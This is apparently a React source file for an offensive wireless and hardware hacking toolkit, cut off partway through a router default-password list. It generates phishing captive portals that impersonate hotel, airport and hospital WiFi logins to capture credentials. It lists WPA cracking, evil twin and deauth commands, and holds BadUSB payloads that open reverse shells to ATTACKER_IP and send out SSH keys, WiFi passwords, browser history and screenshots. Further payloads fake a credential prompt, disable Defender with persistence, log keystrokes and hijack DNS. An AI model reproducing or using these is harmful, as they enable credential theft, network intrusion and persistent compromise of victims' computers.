import { useState, useMemo, useCallback } from 'react';
import { Card } from '../components/ui/Card.jsx';
import { Input } from '../components/ui/Input.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import {
  Wifi, Radio, Cpu, Usb, Shield, Search, Download, Eye, EyeOff,
  AlertTriangle, ChevronRight, Signal, Lock, BarChart3,
  BookOpen, Key, Hash, Terminal, Zap, FileText, Copy,
  Check, RefreshCw, Plus, CreditCard, Tv,
} from 'lucide-react';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';
const ACC = '#7DD3FC';
const BG = '#0B0E14';
const PANEL = '#12161F';
const BORDER = 'rgba(255,255,255,0.08)';
const TEXT = '#E2E8F0';
const DIM = 'rgba(226,232,240,0.55)';

const TABS = [
  { key: 'portal', label: 'Captive Portal', icon: Wifi },
  { key: 'attacks', label: 'Attack Reference', icon: Terminal },
  { key: 'flipper', label: 'Flipper Wireless', icon: Radio },
  { key: 'analyzer', label: 'WiFi Analyzer', icon: BarChart3 },
  { key: 'wordlists', label: 'Wordlists', icon: BookOpen },
];

// ═══════════════════════════════════════════════════════
//  PORTAL TEMPLATES
// ═══════════════════════════════════════════════════════

const PORTAL_TEMPLATES = [
  { id: 'hotel', label: 'Hotel WiFi', brandColor: '#C9A44A', logo: '🏨' },
  { id: 'airport', label: 'Airport WiFi', brandColor: '#3B82F6', logo: '✈️' },
  { id: 'coffee', label: 'Coffee Shop', brandColor: '#92400E', logo: '☕' },
  { id: 'corporate', label: 'Corporate Guest', brandColor: '#6366F1', logo: '🏢' },
  { id: 'university', label: 'University', brandColor: '#DC2626', logo: '🎓' },
  { id: 'isp', label: 'ISP Portal', brandColor: '#0EA5E9', logo: '🌐' },
  { id: 'hospital', label: 'Hospital WiFi', brandColor: '#10B981', logo: '🏥' },
  { id: 'conference', label: 'Conference WiFi', brandColor: '#8B5CF6', logo: '🎤' },
];

function generatePortalHTML(cfg) {
  const { template, ssid, logoUrl, terms, buttonText, redirectUrl, theme } = cfg;
  const tpl = PORTAL_TEMPLATES.find(t => t.id === template) || PORTAL_TEMPLATES[0];
  const isDark = theme === 'dark';
  const bg = isDark ? '#1a1a2e' : '#f5f5f5';
  const cardBg = isDark ? '#16213e' : '#ffffff';
  const textCol = isDark ? '#e2e8f0' : '#1a1a1a';
  const dimCol = isDark ? '#94a3b8' : '#6b7280';
  const inputBg = isDark ? '#0f3460' : '#f0f0f0';
  const inputBorder = isDark ? '#334155' : '#d1d5db';
  const logoHTML = logoUrl
    ? `<img src="${logoUrl}" alt="Logo" style="max-height:48px;margin-bottom:16px;" />`
    : `<div style="font-size:40px;margin-bottom:12px;">${tpl.logo}</div>`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>${ssid || tpl.label} - WiFi Access</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:${bg};min-height:100vh;display:flex;align-items:center;justify-content:center;color:${textCol}}
.portal-card{background:${cardBg};border-radius:12px;padding:40px 32px;max-width:420px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,${isDark?'0.4':'0.12'})}
.portal-card h1{font-size:20px;font-weight:700;margin-bottom:4px}
.portal-card .subtitle{font-size:13px;color:${dimCol};margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:12px;font-weight:600;margin-bottom:6px;color:${dimCol}}
.field input{width:100%;padding:10px 14px;border:1px solid ${inputBorder};border-radius:8px;font-size:14px;background:${inputBg};color:${textCol};outline:none}
.field input:focus{border-color:${tpl.brandColor};box-shadow:0 0 0 3px ${tpl.brandColor}33}
.terms{font-size:11px;color:${dimCol};margin:16px 0;line-height:1.5}
.submit-btn{width:100%;padding:12px;border:none;border-radius:8px;background:${tpl.brandColor};color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:opacity 0.2s}
.submit-btn:hover{opacity:0.9}
.spinner{display:none;text-align:center;padding:24px}
.spinner.active{display:block}
.spinner svg{animation:spin 1s linear infinite;width:32px;height:32px}
@keyframes spin{to{transform:rotate(360deg)}}
.success{display:none;text-align:center;padding:24px}
.success.active{display:block}
.success h2{color:${tpl.brandColor};margin-bottom:8px}
</style>
</head>
<body>
<div class="portal-card" id="portal">
  <div style="text-align:center">${logoHTML}</div>
  <h1 style="text-align:center">${ssid || tpl.label}</h1>
  <p class="subtitle" style="text-align:center">Connect to the internet</p>
  <form id="loginForm" onsubmit="handleSubmit(event)">
    <div class="field">
      <label>Email or Username</label>
      <input type="text" name="username" placeholder="Enter your email" required />
    </div>
    <div class="field">
      <label>Password</label>
      <input type="password" name="password" placeholder="Enter password" required />
    </div>
    <p class="terms">${terms || 'By connecting, you agree to the Terms of Service and acceptable use policy. Network activity may be monitored.'}</p>
    <button type="submit" class="submit-btn">${buttonText || 'Connect to WiFi'}</button>
  </form>
  <div class="spinner" id="spinner">
    <svg viewBox="0 0 24 24" fill="none" stroke="${tpl.brandColor}" stroke-width="2"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"/><path d="M12 2a10 10 0 0 1 10 10" stroke-linecap="round"/></svg>
    <p style="margin-top:12px;color:${dimCol};font-size:13px">Connecting to ${ssid || tpl.label}...</p>
  </div>
  <div class="success" id="success">
    <h2>✓ Connected!</h2>
    <p style="color:${dimCol};font-size:13px">You now have internet access. Redirecting...</p>
  </div>
</div>
<script>
function handleSubmit(e){
  e.preventDefault();
  var f=e.target;
  var d={username:f.username.value,password:f.password.value,ssid:"${ssid||tpl.label}",timestamp:new Date().toISOString()};
  console.log("Captured:",JSON.stringify(d));
  f.style.display="none";
  document.getElementById("spinner").classList.add("active");
  setTimeout(function(){
    document.getElementById("spinner").classList.remove("active");
    document.getElementById("success").classList.add("active");
    setTimeout(function(){window.location.href="${redirectUrl||'https://www.google.com'}"},2000);
  },2500);
}
</script>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════════
//  ATTACK REFERENCE DATA
// ═══════════════════════════════════════════════════════

const WPA_ATTACKS = [
  { cmd: 'airmon-ng check kill', desc: 'Kill interfering processes before enabling monitor mode', reqs: 'aircrack-ng suite, root' },
  { cmd: 'airmon-ng start wlan0', desc: 'Enable monitor mode on wlan0 (creates wlan0mon)', reqs: 'aircrack-ng suite, root' },
  { cmd: 'airodump-ng wlan0mon', desc: 'Scan all channels for available networks', reqs: 'Monitor mode enabled' },
  { cmd: 'airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon', desc: 'Capture handshake on specific channel/BSSID', reqs: 'Target BSSID and channel identified' },
  { cmd: 'aireplay-ng -0 5 -a <BSSID> wlan0mon', desc: 'Send 5 deauth frames to force client reconnection (handshake capture)', reqs: 'Clients connected to target AP' },
  { cmd: 'aireplay-ng -0 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon', desc: 'Continuous deauth targeting specific client', reqs: 'Known client MAC' },
  { cmd: 'aircrack-ng -w wordlist.txt capture-01.cap', desc: 'Crack captured WPA handshake with wordlist', reqs: 'Captured .cap with handshake' },
  { cmd: 'aircrack-ng -J hashfile capture-01.cap', desc: 'Convert .cap to .hccap for hashcat', reqs: 'Captured handshake' },
  { cmd: 'hashcat -m 22000 hash.hc22000 wordlist.txt', desc: 'Crack WPA/WPA2 with hashcat (PMKID/EAPOL)', reqs: 'hashcat, GPU recommended' },
  { cmd: 'hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d', desc: 'Brute-force 8-digit WPA password', reqs: 'hashcat, GPU' },
  { cmd: 'hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --enable_status=15', desc: 'Capture PMKID (no client needed) and EAPOL frames', reqs: 'hcxdumptool, monitor mode' },
  { cmd: 'hcxpcapngtool -o hash.hc22000 capture.pcapng', desc: 'Convert pcapng to hashcat 22000 format', reqs: 'hcxtools' },
  { cmd: 'reaver -i wlan0mon -b <BSSID> -vv', desc: 'Brute-force WPS PIN (online attack)', reqs: 'WPS enabled on target, reaver' },
  { cmd: 'reaver -i wlan0mon -b <BSSID> -vv -K', desc: 'Pixie Dust WPS attack (offline, faster)', reqs: 'reaver with PixieWPS support' },
  { cmd: 'bully -b <BSSID> -c <channel> wlan0mon', desc: 'Alternative WPS brute-force tool', reqs: 'bully, WPS enabled' },
  { cmd: 'wifite --wpa --dict wordlist.txt', desc: 'Automated WPA/WPA2 attack (capture + crack)', reqs: 'wifite2, aircrack-ng suite' },
  { cmd: 'wifite --wps --wpa --kill', desc: 'Wifite with WPS + WPA attacks, auto-kill processes', reqs: 'wifite2, full suite' },
  { cmd: 'cap2hccapx capture-01.cap hash.hccapx', desc: 'Legacy cap to hccapx conversion', reqs: 'hashcat-utils' },
];

const EVIL_TWIN = [
  { cmd: `cat > /tmp/hostapd.conf << EOF\ninterface=wlan0\ndriver=nl80211\nssid=FreeWiFi\nhw_mode=g\nchannel=6\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nEOF\nhostapd /tmp/hostapd.conf`, desc: 'Create open evil twin AP with hostapd', reqs: 'hostapd, AP-capable adapter' },
  { cmd: `cat > /tmp/dnsmasq.conf << EOF\ninterface=wlan0\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nEOF\ndnsmasq -C /tmp/dnsmasq.conf`, desc: 'DHCP + DNS server for evil twin (redirects all DNS)', reqs: 'dnsmasq' },
  { cmd: 'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\niptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT\necho 1 > /proc/sys/net/ipv4/ip_forward', desc: 'NAT and IP forwarding for internet access through evil twin', reqs: 'iptables, root' },
  { cmd: 'iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080', desc: 'Redirect HTTP traffic to captive portal on port 8080', reqs: 'iptables, web server on 8080' },
  { cmd: 'airbase-ng -e "FreeWiFi" -c 6 wlan0mon', desc: 'Create fake AP with airbase-ng (creates at0 interface)', reqs: 'aircrack-ng suite, monitor mode' },
  { cmd: 'airbase-ng -e "<TARGET_SSID>" -c <channel> -a <BSSID> wlan0mon', desc: 'Clone specific AP (SSID + BSSID spoofing)', reqs: 'Target AP details' },
  { cmd: 'fluxion', desc: 'Automated evil twin + captive portal attack framework', reqs: 'Fluxion, aircrack-ng, hostapd, dnsmasq' },
  { cmd: 'wifipumpkin3 --xpulp "set interface wlan0; set ssid FreeWiFi; start"', desc: 'WiFi-Pumpkin3 rogue AP framework with proxy', reqs: 'wifipumpkin3 (Python3)' },
  { cmd: 'eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds', desc: 'WPA-Enterprise evil twin (captures RADIUS creds)', reqs: 'eaphammer, AP adapter' },
  { cmd: 'mana-toolkit', desc: 'MANA evil twin toolkit with Karma attacks', reqs: 'hostapd-mana, crackapd' },
  { cmd: 'python3 -m http.server 8080 --directory /path/to/portal/', desc: 'Quick HTTP server for captive portal page', reqs: 'Python3' },
];

const DEAUTH_ATTACKS = [
  { cmd: 'aireplay-ng -0 0 -a <BSSID> wlan0mon', desc: 'Continuous deauth to all clients of AP', reqs: 'aircrack-ng, monitor mode' },
  { cmd: 'aireplay-ng -0 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon', desc: 'Targeted deauth to specific client (10 frames)', reqs: 'Known client MAC' },
  { cmd: 'mdk4 wlan0mon d -B <BSSID>', desc: 'MDK4 targeted deauth attack', reqs: 'mdk4, monitor mode' },
  { cmd: 'mdk4 wlan0mon d', desc: 'MDK4 mass deauth (all detected APs)', reqs: 'mdk4, monitor mode' },
  { cmd: 'mdk4 wlan0mon b -f ssids.txt -c 6', desc: 'Beacon flood — create fake APs from SSID list', reqs: 'mdk4, SSID list file' },
  { cmd: 'mdk4 wlan0mon b -a -c 6', desc: 'Beacon flood with random SSIDs', reqs: 'mdk4' },
  { cmd: 'mdk4 wlan0mon a -m', desc: 'Authentication flood — overwhelm AP with fake auth requests', reqs: 'mdk4' },
  { cmd: 'mdk4 wlan0mon a -a <BSSID> -m', desc: 'Targeted auth flood to specific AP', reqs: 'mdk4' },
  { cmd: 'scapy: sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=bssid,addr3=bssid)/Dot11Deauth(),iface="wlan0mon",count=100)', desc: 'Custom deauth with Scapy (Python)', reqs: 'Scapy, monitor mode' },
];

const MONITOR_SNIFF = [
  { cmd: 'wireshark -i wlan0mon -k -f "type mgt subtype deauth"', desc: 'Wireshark: capture only deauth frames', reqs: 'Wireshark, monitor mode' },
  { cmd: 'wireshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08"', desc: 'Wireshark: filter beacon frames', reqs: 'Wireshark' },
  { cmd: 'wireshark -Y "eapol"', desc: 'Wireshark: filter EAPOL (handshake) frames', reqs: 'Wireshark' },
  { cmd: 'tshark -i wlan0mon -f "type mgt subtype probe-req" -T fields -e wlan.sa -e wlan_mgt.ssid', desc: 'tshark: capture probe requests (device tracking)', reqs: 'tshark, monitor mode' },
  { cmd: 'tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid -e wlan.bssid -e radiotap.dbm_antsignal', desc: 'tshark: list SSIDs with signal strength', reqs: 'tshark, monitor mode' },
  { cmd: 'tshark -i wlan0mon -Y "eapol" -w handshake.pcap', desc: 'tshark: capture handshakes to file', reqs: 'tshark' },
  { cmd: 'kismet -c wlan0mon', desc: 'Kismet wireless IDS — detect APs, clients, attacks', reqs: 'Kismet, monitor mode' },
  { cmd: 'kismet --override wardrive', desc: 'Kismet in wardrive mode (GPS logging)', reqs: 'Kismet, GPS dongle' },
  { cmd: 'horst -i wlan0mon', desc: 'horst — lightweight 802.11 analyzer (TUI)', reqs: 'horst' },
  { cmd: 'wash -i wlan0mon', desc: 'Scan for WPS-enabled networks', reqs: 'reaver/wash, monitor mode' },
  { cmd: 'airodump-ng --wps wlan0mon', desc: 'Airodump with WPS info display', reqs: 'aircrack-ng' },
  { cmd: 'tcpdump -i wlan0mon -e -s 256 type mgt', desc: 'tcpdump: capture management frames', reqs: 'tcpdump, monitor mode' },
];

const ATTACK_CATEGORIES = [
  { key: 'wpa', label: 'WPA/WPA2 Cracking', icon: Key, data: WPA_ATTACKS, accent: '#F87171' },
  { key: 'evil', label: 'Evil Twin', icon: Wifi, data: EVIL_TWIN, accent: '#A78BFA' },
  { key: 'deauth', label: 'Deauth Attacks', icon: Zap, data: DEAUTH_ATTACKS, accent: '#FBBF24' },
  { key: 'monitor', label: 'Monitoring & Sniffing', icon: Search, data: MONITOR_SNIFF, accent: '#34D399' },
];

// ═══════════════════════════════════════════════════════
//  FLIPPER DATA
// ═══════════════════════════════════════════════════════

const FLIPPER_SUBGHZ_FREQS = [
  { range: '300–348 MHz', region: 'US', devices: 'Garage doors (older), security panels, tire pressure sensors' },
  { range: '387–464 MHz', region: 'EU/US/Asia', devices: 'Car key fobs (315/433MHz), doorbells, weather stations, IoT remotes' },
  { range: '779–928 MHz', region: 'EU/US', devices: 'LoRa (868/915MHz), Z-Wave, smart meters, alarm systems' },
];

const FLIPPER_PROTOCOLS = [
  { name: 'Princeton', bits: 24, encoding: 'OOK', desc: 'Simple fixed code. Doorbells, cheap remotes.' },
  { name: 'CAME', bits: 12, encoding: 'OOK', desc: 'European gates/barriers. Fixed code.' },
  { name: 'Nice FLO', bits: 12, encoding: 'OOK', desc: 'Italian gate automation. Fixed code.' },
  { name: 'Linear', bits: 10, encoding: 'OOK', desc: 'US garage doors with DIP switches.' },
  { name: 'Holtek', bits: 12, encoding: 'OOK', desc: 'HT6P20B encoder. Asian/budget remotes.' },
  { name: 'KeeLoq', bits: 66, encoding: 'Rolling', desc: 'Rolling code. Modern car fobs, garage openers.' },
  { name: 'Star Line', bits: 64, encoding: 'Rolling', desc: 'Car alarm rolling code. Russian/Eastern EU vehicles.' },
  { name: 'Chamberlain', bits: 9, encoding: 'Trinary', desc: 'LiftMaster/Chamberlain garage doors.' },
  { name: 'Gate TX', bits: 24, encoding: 'OOK', desc: 'Generic 24-bit gate transmitter protocol.' },
  { name: 'Nero Radio', bits: 56, encoding: 'OOK', desc: 'Nero Electronics. Blinds and shutters.' },
];

const FLIPPER_SUB_EXAMPLE_RAW = `Filetype: Flipper SubGhz RAW File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: RAW
RAW_Data: 5017 -520 492 -513 493 -510 496 -508 498 -23058`;

const FLIPPER_SUB_EXAMPLE_KEY = `Filetype: Flipper SubGhz Key File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: Princeton
Bit: 24
Key: 00 00 00 00 00 11 22 33
TE: 400`;

const FLIPPER_NFC_TYPES = [
  { type: 'EM4100', freq: '125 kHz', rw: 'Read', notes: 'Most common LF card. Simple Manchester.' },
  { type: 'HID Prox', freq: '125 kHz', rw: 'Read', notes: '26-bit H10301. US access control standard.' },
  { type: 'T5577', freq: '125 kHz', rw: 'Read/Write', notes: 'Universal writable card. Emulates EM4100/HID.' },
  { type: 'MIFARE Classic 1K', freq: '13.56 MHz', rw: 'Read/Write/Emulate', notes: 'Crypto1 broken. Default keys often work.' },
  { type: 'MIFARE Classic 4K', freq: '13.56 MHz', rw: 'Read/Write/Emulate', notes: 'Same broken crypto, more storage.' },
  { type: 'MIFARE Ultralight', freq: '13.56 MHz', rw: 'Read/Write/Emulate', notes: 'No auth. Transit tickets, disposable.' },
  { type: 'NTAG 213/215/216', freq: '13.56 MHz', rw: 'Read/Write/Emulate', notes: '32-bit password. Amiibo (215), NFC tags.' },
  { type: 'MIFARE DESFire', freq: '13.56 MHz', rw: 'Read UID only', notes: 'AES-128. Not easily cloneable.' },
  { type: 'iClass', freq: '13.56 MHz', rw: 'Read', notes: 'HID iClass. SE variant is more secure.' },
];

const FLIPPER_MIFARE_KEYS = [
  { key: 'FF FF FF FF FF FF', desc: 'Factory default — try first' },
  { key: 'A0 A1 A2 A3 A4 A5', desc: 'NFC Forum MAD key (Sector 0, Key A)' },
  { key: 'D3 F7 D3 F7 D3 F7', desc: 'Common transport/transit systems' },
  { key: '00 00 00 00 00 00', desc: 'Null key — some cheap cards' },
  { key: 'B0 B1 B2 B3 B4 B5', desc: 'Common Key B default' },
  { key: '4D 3A 99 C3 51 DD', desc: 'NDEF formatted cards' },
  { key: '1A 98 2C 7E 45 9A', desc: 'Some vending machines' },
  { key: 'AA BB CC DD EE FF', desc: 'Test/development cards' },
];

const FLIPPER_IR_PROTOCOLS = [
  { name: 'NEC', bits: '32', desc: 'Most common. Samsung, LG, most Asian brands.' },
  { name: 'Samsung32', bits: '32', desc: 'Samsung TVs and soundbars.' },
  { name: 'RC5', bits: '14', desc: 'Philips protocol. European TVs.' },
  { name: 'RC6', bits: '16+', desc: 'Philips/Microsoft MCE remotes.' },
  { name: 'Sony SIRC', bits: '12/15/20', desc: 'Sony TVs, PlayStation.' },
  { name: 'Pioneer', bits: '32', desc: 'Pioneer audio/AV equipment.' },
  { name: 'Panasonic', bits: '48', desc: 'Panasonic/National devices.' },
  { name: 'Sharp', bits: '15', desc: 'Sharp TVs and ACs.' },
];

const FLIPPER_IR_FILE_EXAMPLE = `Filetype: Flipper SubGhz Key File
Version: 1
#
name: Power
type: parsed
protocol: NECext
address: 04 FB 00 00
command: 08 F7 00 00
#
name: Vol_Up
type: parsed
protocol: NECext
address: 04 FB 00 00
command: 02 FD 00 00`;

const FLIPPER_BADUSB_PAYLOADS = [
  { name: 'Reverse Shell Dropper (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"\nENTER` },
  { name: 'Reverse Shell Dropper (macOS)', code: `DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING Terminal\nDELAY 500\nENTER\nDELAY 1000\nSTRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\nENTER\nSTRING exit\nENTER` },
  { name: 'WiFi Password Exfiltrator (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "netsh wlan show profiles | Select-String 'All User' | ForEach-Object { $_ -match 'All User Profile\\s*:\\s*(.+)$'; $p=$matches[1].Trim(); $r=netsh wlan show profile name=$p key=clear; $k=($r | Select-String 'Key Content').ToString().Split(':')[1].Trim(); echo \\"$p : $k\\" } | Out-File $env:TEMP\\wifi.txt; Invoke-WebRequest -Uri http://ATTACKER_IP:8080/upload -Method POST -InFile $env:TEMP\\wifi.txt"\nENTER` },
  { name: 'WiFi Password Exfiltrator (macOS)', code: `DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING Terminal\nENTER\nDELAY 1000\nSTRING security find-generic-password -ga "$(networksetup -getairportnetwork en0 | awk -F': ' '{print $2}')" 2>&1 | grep password > /tmp/wifi.txt && curl -X POST -F "file=@/tmp/wifi.txt" http://ATTACKER_IP:8080/upload && rm /tmp/wifi.txt\nENTER\nSTRING exit\nENTER` },
  { name: 'Credential Harvester (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "$cred=Get-Credential -Message 'Windows Update requires authentication';$u=$cred.UserName;$p=$cred.GetNetworkCredential().Password;Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/creds' -Method POST -Body @{u=$u;p=$p}"\nENTER` },
  { name: 'Browser History Grab (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "Copy-Item $env:LOCALAPPDATA\\Google\\Chrome\\User' 'Data\\Default\\History $env:TEMP\\h.db; $q='SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT 50'; Add-Type -Path 'System.Data.SQLite.dll'; $cn=New-Object Data.SQLite.SQLiteConnection('Data Source='+$env:TEMP+'\\h.db'); $cn.Open(); $cm=$cn.CreateCommand(); $cm.CommandText=$q; $r=$cm.ExecuteReader(); while($r.Read()){echo ($r[0]+' | '+$r[1])} | Out-File $env:TEMP\\hist.txt; curl http://ATTACKER_IP:8080/upload -F 'file=@'+$env:TEMP+'\\hist.txt'"\nENTER` },
  { name: 'Screenshot Capture (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "Add-Type -AssemblyName System.Windows.Forms; $b=[Drawing.Bitmap]::new([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save($env:TEMP+'\\ss.png'); Invoke-WebRequest -Uri http://ATTACKER_IP:8080/upload -Method POST -InFile ($env:TEMP+'\\ss.png')"\nENTER` },
  { name: 'Privilege Escalation Check (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "whoami /priv | Out-File $env:TEMP\\privs.txt; systeminfo | Out-File -Append $env:TEMP\\privs.txt; net localgroup administrators | Out-File -Append $env:TEMP\\privs.txt; Get-Process | Out-File -Append $env:TEMP\\privs.txt; curl http://ATTACKER_IP:8080/upload -F 'file=@'+$env:TEMP+'\\privs.txt'"\nENTER` },
  { name: 'Disable Defender + Persistence (Windows)', code: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name Update -Value \\"powershell -w hidden -ep bypass -c IEX(IWR http://ATTACKER_IP/payload.ps1)\\"'\nENTER\nDELAY 1000\nALT y` },
  { name: 'System Recon (Linux)', code: `DELAY 1000\nCTRL-ALT t\nDELAY 500\nSTRING (echo "=== $(hostname) ===" && whoami && id && uname -a && cat /etc/passwd && ip a && ss -tlnp && crontab -l && sudo -l) 2>/dev/null | curl -X POST -d @- http://ATTACKER_IP:8080/recon\nENTER` },
  { name: 'SSH Key Exfil (Linux/macOS)', code: `DELAY 1000\nCTRL-ALT t\nDELAY 500\nSTRING tar czf /tmp/k.tgz ~/.ssh 2>/dev/null && curl -X POST -F "file=@/tmp/k.tgz" http://ATTACKER_IP:8080/upload && rm /tmp/k.tgz\nENTER\nSTRING exit\nENTER` },
  { name: 'Ransomware Simulator (Safe)', code: `REM This only creates a warning file - no actual encryption\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "Set-Content $env:USERPROFILE\\Desktop\\README_SECURITY_TEST.txt 'This is a security awareness test. Your files have NOT been encrypted. Contact your IT security team.'"\nENTER` },
  { name: 'DNS Changer (Windows)', code: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell Start-Process powershell -Verb runAs -ArgumentList '-c Get-NetAdapter | Where-Object Status -eq Up | ForEach-Object { Set-DnsClientServerAddress -InterfaceIndex $_.ifIndex -ServerAddresses \\"ATTACKER_DNS_IP\\",\\"8.8.8.8\\" }'\nENTER\nDELAY 1000\nALT y` },
  { name: 'Keylogger Dropper (Windows)', code: `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass -c "$l='';Add-Type -A System.Windows.Forms;$k={param($s,$e);$l+=([char]$e.KeyValue)};$f=[Windows.Forms.Application];Register-ObjectEvent (New-Object Windows.Forms.Timer -Property @{Interval=30000;Enabled=$true}) Tick {$l|Out-File -Append $env:TEMP\\kl.txt;$l=''};[void]$f::Run()"\nENTER` },
  { name: 'OS Detection Preamble', code: `REM Detect OS and branch payload\nDELAY 500\nGUI r\nDELAY 300\nSTRING cmd /c ver > NUL 2>&1 && (echo WINDOWS) || (echo UNIX)\nENTER\nREM Continue with OS-specific payload below` },
  { name: 'Rickroll (Harmless)', code: `DELAY 500\nGUI r\nDELAY 300\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER` },
];

const DUCKY_CHEATSHEET = [
  { cmd: 'DELAY <ms>', desc: 'Wait for specified milliseconds' },
  { cmd: 'STRING <text>', desc: 'Type a string of characters' },
  { cmd: 'STRINGLN <text>', desc: 'Type string + press Enter (DuckyScript 3.0)' },
  { cmd: 'ENTER', desc: 'Press Enter key' },
  { cmd: 'GUI / WINDOWS', desc: 'Press Windows/Super key' },
  { cmd: 'GUI r', desc: 'Open Run dialog (Windows)' },
  { cmd: 'GUI SPACE', desc: 'Open Spotlight (macOS)' },
  { cmd: 'CTRL-ALT t', desc: 'Open terminal (Linux)' },
  { cmd: 'ALT F4', desc: 'Close window' },
  { cmd: 'ALT TAB', desc: 'Switch windows' },
  { cmd: 'TAB', desc: 'Tab key' },
  { cmd: 'CTRL c / v / x / z', desc: 'Copy / Paste / Cut / Undo' },
  { cmd: 'REM <text>', desc: 'Comment line (not executed)' },
  { cmd: 'REPEAT <n>', desc: 'Repeat previous command n times (v3)' },
  { cmd: 'DEFINE / VAR', desc: 'Define constants/variables (v3)' },
  { cmd: 'IF / ELSE / END_IF', desc: 'Conditional execution (v3)' },
  { cmd: 'WHILE / END_WHILE', desc: 'Loop construct (v3)' },
  { cmd: 'FUNCTION / END_FUNCTION', desc: 'Function definitions (v3)' },
  { cmd: 'WAIT_FOR_BUTTON_PRESS', desc: 'Pause until button pressed (v3)' },
  { cmd: 'LED_R / LED_G', desc: 'Control payload LED indicator (v3)' },
];

// ═══════════════════════════════════════════════════════
//  WORDLIST DATA
// ═══════════════════════════════════════════════════════

const ROUTER_DEFAULTS = [
  { brand: 'NETGEAR', patterns: ['password', 'admin', '1234', 'password1'], defaultUser: 'admin', notes: 'Often uses "password" or serial number' },
  { brand: 'Linksys', patterns: ['admin', '', 'linksys', 'password'], defaultUser: 'admin', notes: 'Older models had blank password' },
  { brand: 'TP-Link', patterns: ['admin', 'tplink', 'password', '12345678'], defaultUser: 'admin', notes: 'Newer models use random on sticker' },
  { brand: 'D-Link', patterns: ['admin', '', 'password', 'user'], defaultUser: 'admin', notes: 'Some models have blank default' },
  { brand: 'ASUS', patterns: ['admin', 'password', '1234', 'asus'], defaultUser: 'admin', notes: 'RT-series: admin/admin' },
  { brand: 'Belkin', patterns: ['', 'belkin', 'password', 'admin'], defaultUser: 'admin', notes: 'Often blank or "belkin"' },
  { brand: 'Cisco', patterns: ['cisco', 'admin', 'password', 'Cisco'], defaultUser: 'admin/cisco', notes: 'Varies by model series' },
  { brand: 'Huawei', patterns: ['admin', 'huawei', 'password', 'HG8245H'], defaultUser: 'admin/telecomadmin', notes: 'ISP variants have custom defaults' },
  { brand: 'ZTE', patterns: ['admin', 'zte', 'password', '1234'], defaultUser: 'admin', notes: 'Common in ISP-provided routers' },
  { brand: 'Ubiquiti', patterns: ['ubnt', 'admin', 'password', 'ui'], defaultUser: 'ubnt', notes: 'UniFi: set during setup' },
  { brand: 'Mikrotik', patterns: ['', 'admin', 'changeme', 'mikrotik'], defaultUser: 'admin', notes: 'RouterOS default is blank password' },
  { brand: 'Arris', patterns: ['password', 'admin', '1234', 'motorola'], defaultUser: 'admin', notes: 'Cable modem/router combos' },
  { brand: 'Motorola', patterns: ['motorola', 'admin', 'password', 'cable'], defaultUser: 'admin', notes: 'Surfboard series' },
